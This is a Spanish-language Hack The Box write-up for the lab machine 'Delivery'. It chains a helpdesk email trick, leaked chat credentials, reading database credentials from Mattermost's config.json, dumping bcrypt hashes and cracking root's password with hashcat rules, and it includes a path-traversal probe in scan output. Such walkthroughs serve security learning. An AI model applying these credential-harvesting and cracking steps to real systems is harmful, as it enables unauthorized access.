---
layout: single
title: Delivery - Hack The Box
excerpt: "En este post estaremos resolviendo la maquina Delivery de la plataforma de Hackthebox donde nos tendremos que aprovechar de un sistema de tickets para poder activar nuestra cuenta y poder asi conectarnos al sistema de MatterMost donde mediante el chat de los empleados veremos que comparten credenciales para conectarnos por ssh para la escalada de privilegios tendremos que enumerar la base de datos que encontraremos las credenciales en un archivo config dentro de la maquina y jugaremos con reglas de hashcat para crackear el hash de root"
date: 2023-06-07
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-delivery/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Database Enumeration MYSQL
  - Cracking Hashes
  - MatterMost
  - Hashcat Rules
  - Support Ticket System
---

⮕ Maquina Linux
 ```bash
❯ ping -c 1 10.10.10.222
PING 10.10.10.222 (10.10.10.222) 56(84) bytes of data.
64 bytes from 10.10.10.222: icmp_seq=1 ttl=63 time=1147 ms

--- 10.10.10.222 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1146.884/1146.884/1146.884/0.000 ms
❯ whichSystem.py 10.10.10.222

10.10.10.222 (ttl -> 63): Linux

```

## PortScan

```bash
❯ nmap -sCV -p22,80,8065 10.10.10.222 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 12:22 CST
Nmap scan report for 10.10.10.222
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)
|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)
|_  256 b79df7489da2f27630fd42d3353a808c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 07 Jun 2023 18:16:05 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: 4exyoihdetrazgnufr946me1ee
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Wed, 07 Jun 2023 18:22:23 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Wed, 07 Jun 2023 18:22:23 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.93%I=7%D=6/7%Time=6480CADD%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
SF:20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\r
SF:\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancestor
SF:s\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\nContent
SF:-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Wed,\x2007\x
SF:20Jun\x202023\x2018:16:05\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX
SF:-Request-Id:\x204exyoihdetrazgnufr946me1ee\r\nX-Version-Id:\x205\.30\.0
SF:\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Wed,\x2
SF:007\x20Jun\x202023\x2018:22:23\x20GMT\r\n\r\n<!doctype\x20html><html\x2
SF:0lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"viewport\
SF:"\x20content=\"width=device-width,initial-scale=1,maximum-scale=1,user-
SF:scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20nofollow
SF:\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>Matterm
SF:ost</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\"yes\">
SF:<meta\x20name=\"application-name\"\x20content=\"Mattermost\"><meta\x20n
SF:ame=\"format-detection\"\x20content=\"telephone=no\"><link\x20re")%r(HT
SF:TPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20
SF:Wed,\x2007\x20Jun\x202023\x2018:22:23\x20GMT\r\nContent-Length:\x200\r\
SF:n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

```ruby
❯ whatweb http://10.10.10.222
http://10.10.10.222 [200 OK] Country[RESERVED][ZZ], Email[jane@untitled.tld], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.222], JQuery, Script, Title[Welcome], nginx[1.14.2]
❯ whatweb http://10.10.10.222:8065
http://10.10.10.222:8065 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.222], Script, Title[Mattermost], UncommonHeaders[content-security-policy,x-request-id,x-version-id], X-Frame-Options[SAMEORIGIN]

```

Esta es la pagina web que esta corriendo en el puerto **80**

![](/assets/images/htb-writeup-delivery/web1.png)

En el puerto **8065** esta corriendo un servicio que se llama **Mattermost**

![](/assets/images/htb-writeup-delivery/web2.png)

Vamos aplicar **Fuzzing** para ver si encontramos rutas interesantes

Y bueno en la web que corren en el puerto **80** encontramos un **README.MD**

```bash
❯ dirsearch -u http://10.10.10.222

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.10.222/_23-06-07_12-27-59.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-07_12-27-59.log

Target: http://10.10.10.222/

[12:27:59] Starting: 
[12:28:15] 200 -  648B  - /README.MD
[12:28:34] 301 -  185B  - /assets  ->  http://10.10.10.222/assets/
[12:28:34] 403 -  571B  - /assets/
[12:28:44] 301 -  185B  - /error  ->  http://10.10.10.222/error/
[12:28:45] 200 -    1KB - /error/
[12:28:50] 301 -  185B  - /images  ->  http://10.10.10.222/images/
[12:28:50] 403 -  571B  - /images/
[12:28:50] 200 -   11KB - /index.html

Task Completed
```

Pero bueno no es nada interesante solo información

```bash
❯ curl -s http://10.10.10.222/README.MD
Static Website Example
----------------------

To be used with Cloud Academy labs.


License
----------------------

This static website is based on the Dimension template by [HTML5 UP](https://html5up.net/)

Creative Commons License
All of the site templates I create for [HTML5 UP](https://html5up.net/) are licensed under the Creative Commons Attribution 3.0 License, which means you can:
 - Use them for personal stuff
 - Use them for commercial stuff
 - Change them however you like


... all for free, yo. In exchange, just give HTML5 UP credit for the design and tell your friends about it :)

More info [here](https://html5up.net/license).
```

![](/assets/images/htb-writeup-delivery/web3.png)

Pues bueno tampoco no encontramos algo que nos sea de utilidad ahora por los codigos de estado

```bash
❯ dirsearch -u http://10.10.10.222:8065/login

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.10.222:8065/-login_23-06-07_12-31-13.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-07_12-31-13.log

Target: http://10.10.10.222:8065/login/

[12:31:14] Starting: 
[12:31:15] 301 -    0B  - /login/%2e%2e//google.com  ->  /google.com
[12:31:34] 301 -    0B  - /login/Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /login/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[12:31:41] 400 -   17B  - /login/\..\..\..\..\..\..\..\..\..\etc\passwd
[12:31:46] 301 -    0B  - /login/adm/index.html  ->  ./
[12:31:48] 301 -    0B  - /login/admin/index.html  ->  ./
[12:31:49] 301 -    0B  - /login/admin2/index.html  ->  ./
[12:31:50] 301 -    0B  - /login/admin_area/index.html  ->  ./
[12:31:55] 301 -    0B  - /login/adminarea/index.html  ->  ./
[12:31:56] 301 -    0B  - /login/admincp/index.html  ->  ./
[12:31:58] 301 -    0B  - /login/administrator/index.html  ->  ./
[12:32:04] 301 -    0B  - /login/bb-admin/index.html  ->  ./
[12:32:07] 301 -    0B  - /login/cgi-bin/index.html  ->  ./
[12:32:11] 301 -    0B  - /login/core/latest/swagger-ui/index.html  ->  ./
[12:32:14] 301 -    0B  - /login/demo/ejb/index.html  ->  ./
[12:32:15] 301 -    0B  - /login/doc/html/index.html  ->  ./
[12:32:15] 301 -    0B  - /login/docs/html/admin/index.html  ->  ./
[12:32:15] 301 -    0B  - /login/docs/html/index.html  ->  ./
[12:32:17] 301 -    0B  - /login/engine/classes/swfupload//swfupload.swf  ->  /login/engine/classes/swfupload/swfupload.swf
[12:32:17] 301 -    0B  - /login/engine/classes/swfupload//swfupload_f9.swf  ->  /login/engine/classes/swfupload/swfupload_f9.swf
[12:32:18] 301 -    0B  - /login/estore/index.html  ->  ./
[12:32:18] 301 -    0B  - /login/examples/servlets/index.html  ->  ./
[12:32:18] 301 -    0B  - /login/extjs/resources//charts.swf  ->  /login/extjs/resources/charts.swf
[12:32:22] 301 -    0B  - /login/html/js/misc/swfupload//swfupload.swf  ->  /login/html/js/misc/swfupload/swfupload.swf
[12:32:24] 301 -    0B  - /login/index.html  ->  ./
[12:32:31] 301 -    0B  - /login/manual/index.html  ->  ./
[12:32:32] 301 -    0B  - /login/mifs/user/index.html  ->  ./
[12:32:33] 301 -    0B  - /login/modelsearch/index.html  ->  ./
[12:32:37] 301 -    0B  - /login/panel-administracion/index.html  ->  ./
[12:32:38] 301 -    0B  - /login/phpmyadmin/doc/html/index.html  ->  ./
[12:32:38] 301 -    0B  - /login/phpmyadmin/docs/html/index.html  ->  ./
[12:32:51] 301 -    0B  - /login/siteadmin/index.html  ->  ./
[12:32:56] 301 -    0B  - /login/swagger/index.html  ->  ./
[12:32:57] 301 -    0B  - /login/templates/index.html  ->  ./
[12:32:59] 301 -    0B  - /login/tiny_mce/plugins/imagemanager/pages/im/index.html  ->  ./
[12:33:05] 301 -    0B  - /login/webadmin/index.html  ->  ./
[12:33:05] 301 -    0B  - /login/webdav/index.html  ->  ./

Task Completed
```

Si damos **click** en **contact-us** nos dicen lo siguiente

![](/assets/images/htb-writeup-delivery/web4.png)

Necesitamos crear una cuenta para acceder en el puerto **8065** nos dice que podemos crear una cuenta

![](/assets/images/htb-writeup-delivery/web5.png)

Pero si tratamos de crear una cuenta para acceder vemos el siguiente mensaje ya que necesitamos verificar el **email** pero de primeras no tenemos acceso 

![](/assets/images/htb-writeup-delivery/web6.png)

Pero si miramos el código fuente de la pagina web que corre en el puerto **80** observamos que nos están dando información para poder activar nuestra cuenta

![](/assets/images/htb-writeup-delivery/web7.png)

```bash
❯ echo "10.10.10.222 helpdesk.delivery.htb" | sudo tee -a /etc/hosts
10.10.10.222 helpdesk.delivery.htb
❯ ping -c 1 helpdesk.delivery.htb
PING helpdesk.delivery.htb (10.10.10.222) 56(84) bytes of data.
64 bytes from helpdesk.delivery.htb (10.10.10.222): icmp_seq=1 ttl=63 time=109 ms

--- helpdesk.delivery.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.029/109.029/109.029/0.000 ms
```

## helpdesk.delivery.htb 

Vemos esta web 

![](/assets/images/htb-writeup-delivery/web8.png)

Como estamos como un **Guest User** nos deja crear un **Ticket**

![](/assets/images/htb-writeup-delivery/web9.png)

Nos crea el ticket 

![](/assets/images/htb-writeup-delivery/web10.png)

Ademas nos están diciendo que podemos el estado del **Ticket**`8988279`

Ahora en la sección de **check Ticket Status** vamos a revisar el estado de nuestro **Ticket**

![](/assets/images/htb-writeup-delivery/web11.png)

Y bueno básicamente nos dan el mensaje que nosotros escribimos con opción de **Reset** y **Post Reply**

![](/assets/images/htb-writeup-delivery/web12.png)

Bueno como estamos pudiendo registrar un correo y en el código fuente nos decían que para verificar la cuenta necesitamos acceder a **helpdesk.delivery.htb** lo que podemos hacer es crear un ticket con las mismas credenciales que vamos a registrar en la plataforma de **Mattermost** y aprovechar que recibimos **correos** para activar la cuenta fácilmente

Así que bueno primero vamos a crear una cuenta

![](/assets/images/htb-writeup-delivery/web13.png)

Una vez creado vemos el mismo mensaje que cuando creamos la primer cuenta

![](/assets/images/htb-writeup-delivery/web14.png)

Bueno si pensaste lo mismo que yo pues no es posible ya que en la web que esta corriendo en el puerto **80** nos dice que básicamente un correo que tenga **delivery.htb** y cuando creamos un **Ticket** nos genera una cuenta con la terminación **delivery.htb** así que lo que podemos hacer es crear un **Ticket** en el subdominio y usar esa dirección de correo para que nos llegue el correo 

![](/assets/images/htb-writeup-delivery/web15.png)

Una vez creamos el **ticket** ahora si ya podemos usar el correo 

![](/assets/images/htb-writeup-delivery/web16.png)

Ahora creamos la cuenta con el correo que nos dieron

![](/assets/images/htb-writeup-delivery/web17.png)

Una vez creada la cuenta ahora si podemos ir a verificar el estado de nuestro **ticket** con la cuenta que creamos previamente aqui

![](/assets/images/htb-writeup-delivery/web18.png)

Y bueno nos llega correo de confirmación vamos a dar click en el enlace

![](/assets/images/htb-writeup-delivery/web19.png)

Lo único es que tienes que agregar `delivery.htb` al **/etc/hosts** una vez hecho solo copeas y pegas todo lo que esta después de **Please activate your email by going to:** asta **)** la `url` solamente

Ahora tenemos nuestra cuenta verificada

![](/assets/images/htb-writeup-delivery/web20.png)

## Shell as maildeliver

Después de conectarnos y unirnos al equipo **Internal** y ya nos están dando la contraseña del usuario **maildeliverer** para conectarnos por **SSH**

![](/assets/images/htb-writeup-delivery/web21.png)

Ademas nos están diciendo que la palabra `PleaseSubscribe!` no esta en el **rockyou** pero con reglas de **hashcat** puedes crackear todas las variaciones que tengan que ver con esa palabra así que ahora vamos a conectarnos por **SSH**

```bash
❯ ssh maildeliverer@10.10.10.222
maildeliverer@10.10.10.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$  
```

## User flag

```bash
maildeliverer@Delivery:~$ cat user.txt 
488d736e4ae7c42de2ea882604b9f469
maildeliverer@Delivery:~$ 
```

## Escalada de privilegios

No vamos a abusar del **pkexec**

```bash
maildeliverer@Delivery:/$ find \-perm -4000 2>/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/sudo
./usr/bin/gpasswd
./usr/bin/su
./usr/bin/chfn
./usr/bin/mount
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/umount
./usr/bin/fusermount
maildeliverer@Delivery:/$ 

```

Si nos vamos a esta ruta encontramos un archivo de configuración

```bash
maildeliverer@Delivery:/opt/mattermost/config$ ls
README.md  cloud_defaults.json  config.json
maildeliverer@Delivery:/opt/mattermost/config$ cat config.json 
```

Ademas encontramos contraseñas para la base de datos

```bash
 },
    "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    },
```

Esta corriendo `mysql` en local es por eso que **Nmap** no lo reporto

# Database

Ahora nos vamos a conectar para enumerar

```bash
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -pCrack_The_MM_Admin_PW mattermost
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 82
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [mattermost]> 

```

Estamos en la base de datos **mattermost** y estas son las tables

```bash
MariaDB [mattermost]> show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
| ChannelMembers         |
| Channels               |
| ClusterDiscovery       |
| CommandWebhooks        |
| Commands               |
| Compliances            |
| Emoji                  |
| FileInfo               |
| GroupChannels          |
| GroupMembers           |
| GroupTeams             |
| IncomingWebhooks       |
| Jobs                   |
| Licenses               |
| LinkMetadata           |
| OAuthAccessData        |
| OAuthApps              |
| OAuthAuthData          |
| OutgoingWebhooks       |
| PluginKeyValueStore    |
| Posts                  |
| Preferences            |
| ProductNoticeViewState |
| PublicChannels         |
| Reactions              |
| Roles                  |
| Schemes                |
| Sessions               |
| SidebarCategories      |
| SidebarChannels        |
| Status                 |
| Systems                |
| TeamMembers            |
| Teams                  |
| TermsOfService         |
| ThreadMemberships      |
| Threads                |
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.001 sec)

MariaDB [mattermost]> 
```

La tabla **Users** tiene estas columnas 

```bash
MariaDB [mattermost]> show columns from Users;
+--------------------+--------------+------+-----+---------+-------+
| Field              | Type         | Null | Key | Default | Extra |
+--------------------+--------------+------+-----+---------+-------+
| Id                 | varchar(26)  | NO   | PRI | NULL    |       |
| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |
| Username           | varchar(64)  | YES  | UNI | NULL    |       |
| Password           | varchar(128) | YES  |     | NULL    |       |
| AuthData           | varchar(128) | YES  | UNI | NULL    |       |
| AuthService        | varchar(32)  | YES  |     | NULL    |       |
| Email              | varchar(128) | YES  | UNI | NULL    |       |
| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |
| Nickname           | varchar(64)  | YES  |     | NULL    |       |
| FirstName          | varchar(64)  | YES  |     | NULL    |       |
| LastName           | varchar(64)  | YES  |     | NULL    |       |
| Position           | varchar(128) | YES  |     | NULL    |       |
| Roles              | text         | YES  |     | NULL    |       |
| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |
| Props              | text         | YES  |     | NULL    |       |
| NotifyProps        | text         | YES  |     | NULL    |       |
| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |
| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |
| FailedAttempts     | int(11)      | YES  |     | NULL    |       |
| Locale             | varchar(5)   | YES  |     | NULL    |       |
| Timezone           | text         | YES  |     | NULL    |       |
| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |
| MfaSecret          | varchar(128) | YES  |     | NULL    |       |
+--------------------+--------------+------+-----+---------+-------+
25 rows in set (0.001 sec)

MariaDB [mattermost]> 
```

Hay vemos los **hashes** de los usuarios 

```bash
MariaDB [mattermost]> select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| test2                            | $2a$10$ibHap4/cSHctVzn2E8S5Uuv8whec9OD.z86vHIeSOdjWA.EGUlylm |
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| test                             | $2a$10$7YTVCQ/jgrR7W56jH4x8uugxHSb7Abr3TF1fjU9xYIX8/R6NiVSIG |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
| miguelrega77                     | $2a$10$C6epyJAFnX2AaRqpJzn1tOen.f74dFLrr4.rRxMlW88HypcFDogXC |
| miguelrega7                      | $2a$10$aJIW7Ha27P3KxNwVP.6D0uEOBTDmdkTVCMSQ3/EHLlv0FT9lG1A5q |
+----------------------------------+--------------------------------------------------------------+
11 rows in set (0.001 sec)

MariaDB [mattermost]> 

```

Vamos a crackear el del `root` ya que casi todos los usuarios fueron creados por nosotros mismos

```bash
❯ catn hash
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```

Bueno si recordamos nos decían que podemos crackearla  usando variantes de `PleaseSubscribe!` 

Vamos a crear variantes apartir de esa contraseña 

En esta ruta tenemos las reglas de **hashcat**

```bash
❯ ls /usr/share/hashcat/rules
 hybrid            Incisive-leetspeak.rule       T0XlC-insert_00-99_1950-2050_toprules_0_F.rule   toggles3.rule
 best64.rule       InsidePro-HashManager.rule    T0XlC-insert_space_and_special_0_F.rule          toggles4.rule
 combinator.rule   InsidePro-PasswordsPro.rule   T0XlC-insert_top_100_passwords_1_G.rule          toggles5.rule
 d3ad0ne.rule      leetspeak.rule                T0XlC.rule                                       unix-ninja-leetspeak.rule
 dive.rule         oscommerce.rule               T0XlCv1.rule                                    
 generated.rule    rockyou-30000.rule            toggles1.rule                                   
 generated2.rule   specific.rule                 toggles2.rule                                   

```

Vamos a usar este `/usr/share/hashcat/rules/best64.rule` 

```bash
❯ hashcat --stdout -r /usr/share/hashcat/rules/best64.rule pwd > passwords
❯ wc -l passwords
77 passwords
```

Ahora tenemos la contraseña `PleaseSubscribe!21`

```bash
❯ hashcat -m 3200 -a 0 hash passwords
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 2855/2919 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: passwords
* Passwords.: 77
* Bytes.....: 1177
* Keyspace..: 77
* Runtime...: 0 secs

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Wed Jun  7 13:46:39 2023 (2 secs)
Time.Estimated...: Wed Jun  7 13:46:41 2023 (0 secs)
Guess.Base.......: File (passwords)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       14 H/s (8.83ms) @ Accel:2 Loops:64 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 24/77 (31.17%)
Rejected.........: 0/24 (0.00%)
Restore.Point....: 20/77 (25.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!69

Started: Wed Jun  7 13:45:48 2023
Stopped: Wed Jun  7 13:46:43 2023
```

## Root flag

```bash
maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# whoami
root
root@Delivery:/home/maildeliverer# cd
root@Delivery:~# cat root.txt 
3d3333f616c07934661ac5128b70d34d
root@Delivery:~# 
```
